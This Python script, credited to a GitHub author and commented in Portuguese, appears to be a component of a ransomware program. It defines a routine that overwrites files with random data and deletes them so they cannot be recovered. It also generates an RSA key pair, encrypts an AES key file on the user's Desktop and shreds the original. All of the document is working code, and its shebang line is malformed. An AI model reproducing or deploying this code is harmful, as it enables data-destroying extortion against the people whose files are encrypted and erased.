#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
from Crypto.PublicKey import RSA
import os
import string
import random

def generate_data(length):
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

# destroi o arquivo original e depois exclui, não podendo recupera-lo com buscas na memória
def shred(file_name,  passes):
    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)


# CRIPTOGRAFA A CHAVE AES, COM A CHAVE PUBLICA DO CLIENTE
def AES_to_RSA():
    caminho = os.environ['HOME']+'/Desktop/'
    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    chave = RSA.generate(1024)
    chave_privada = chave.exportKey('DER')
    chave_publica = chave.publickey().exportKey('DER')
    f = open(caminho_correto + 'chave_privada_cliente.txt','wb')
    f.write(chave_privada)
    f.close()
    chave_publica_objeto = RSA.importKey(chave_publica)
    original = caminho_correto + 'AES.txt'
    novo = caminho_correto + 'AES.txt.enc'
    f = open(original,'rb')
    conteudo = f.read()
    f.close()
    f = open(novo,'wb')
    enc = chave_publica_objeto.encrypt(conteudo,'x')[0]
    f.write(enc)
    f.close()
    shred(original,1)
